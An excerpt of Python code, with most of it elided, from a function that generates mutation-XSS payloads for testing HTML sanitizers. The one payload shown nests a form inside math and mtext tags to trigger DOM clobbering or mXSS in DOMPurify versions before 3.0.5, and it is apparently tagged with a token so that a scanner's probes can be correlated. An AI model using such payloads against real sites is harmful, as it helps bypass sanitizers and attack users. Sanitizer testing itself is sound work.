    ...
    def generate_sanitizer_mxss_payloads(token: str) -> List[Dict[str, Any]]:
        ...
        payload_specs = [
            ...
            },
            {
                ...
                "payload": f'<div><form><math><mtext><form><input name="{html.escape(token, quote=True)}"><input></form></mtext></math></form></div>',
                "target_version": "DOMPurify < 3.0.5",
                "notes": "Exploits nested HTML forms within math tags to trigger clobbering/mXSS; the inert input name correlates the parser probe to its run."
            },
            {
